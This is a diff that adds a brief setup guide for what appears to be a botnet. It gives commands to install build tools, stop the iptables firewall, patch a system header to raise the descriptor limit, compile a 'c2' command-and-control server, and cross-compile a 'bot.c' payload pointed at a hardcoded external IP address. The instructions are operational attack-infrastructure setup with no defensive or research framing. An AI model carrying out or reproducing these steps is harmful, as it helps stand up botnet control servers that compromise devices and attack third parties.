@@ -1,0 +1,8 @@
+edit the bot.c file with server, you can change bot port if you want.
+yum update -y
+yum install httpd; yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+service httpd restart; service iptables stop
+sed -i s/1024/9999999/g /usr/include/bits/typesizes.h
+gcc c2.c -o c2 -pthread; rm -rf c2.c
+python compile.py bot.c 185.158.249.243
+screen ./c2 1111 1 333
